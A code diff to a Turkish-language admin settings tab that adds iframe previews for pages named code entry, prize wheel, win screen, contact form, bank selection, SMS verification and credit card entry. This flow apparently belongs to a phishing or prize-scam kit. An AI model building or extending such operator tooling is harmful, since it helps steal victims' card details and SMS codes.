@@ -69,6 +69,29 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
     setUploading(null);
   };
 
+  const [previewPage, setPreviewPage] = useState<string>("code");
+
+  const renderPreview = () => {
+    switch (previewPage) {
+      case "code":
+        return <iframe src="/code" className="w-full h-[600px] border-none rounded-xl" title="Code Entry Preview" />;
+      case "wheel":
+        return <iframe src="/wheel" className="w-full h-[600px] border-none rounded-xl" title="Wheel Preview" />;
+      case "win":
+        return <iframe src="/win/preview" className="w-full h-[600px] border-none rounded-xl" title="Win Preview" />;
+      case "form":
+        return <iframe src="/form/preview" className="w-full h-[600px] border-none rounded-xl" title="Form Preview" />;
+      case "banken":
+        return <iframe src="/banken" className="w-full h-[600px] border-none rounded-xl" title="Banken Preview" />;
+      case "sms":
+        return <iframe src="/sms/preview" className="w-full h-[600px] border-none rounded-xl" title="SMS Preview" />;
+      case "card":
+        return <iframe src="/card/preview" className="w-full h-[600px] border-none rounded-xl" title="Card Preview" />;
+      default:
+        return <iframe src="/code" className="w-full h-[600px] border-none rounded-xl" title="Code Entry Preview" />;
+    }
+  };
+
   if (loading) return <div className="opacity-50">Yükleniyor...</div>;
   if (!settings) return <div className="opacity-50">Ayarlar bulunamadı.</div>;
 
@@ -151,8 +174,33 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
 
           </div>
         </div>
+
+        <div className={`p-6 rounded-xl border shadow-sm ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
+          <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4 border-b pb-4">
+            <h3 className={`text-lg font-bold ${darkMode ? 'text-[#EB5E28]' : 'text-[#EB5E28]'}`}>Gerçek Zamanlı Sayfa Tasarım Önizlemeleri</h3>
+            <select 
+              value={previewPage} 
+              onChange={(e) => setPreviewPage(e.target.value)}
+              className={`p-2 rounded-lg border text-sm font-bold outline-none cursor-pointer ${darkMode ? 'bg-[#121212] text-white border-zinc-700' : 'bg-gray-100 text-gray-900 border-gray-300'}`}
+            >
+              <option value="code">Kod Giriş Ekranı</option>
+              <option value="wheel">Çark Oyunu</option>
+              <option value="win">Kazanma (Tebrikler) Ekranı</option>
+              <option value="form">İsim / İletişim Formu</option>
+              <option value="banken">Banka Seçim Listesi</option>
+              <option value="sms">SMS Doğrulama Ekranı</option>
+              <option value="card">Kredi Kartı Bilgi Ekranı</option>
+            </select>
+          </div>
+          
+          <div className="w-full flex justify-center bg-black/5 rounded-xl border border-white/10 p-4">
+            <div className="w-[375px] max-w-full relative shadow-[0_0_50px_rgba(0,0,0,0.3)] rounded-[30px] overflow-hidden border-[8px] border-[#222]">
+              {renderPreview()}
+            </div>
+          </div>
+        </div>
         
-        <div className="flex justify-end sticky bottom-6">
+        <div className="flex justify-end sticky bottom-6 z-10">
           <button 
             type="submit" 
             disabled={saving}
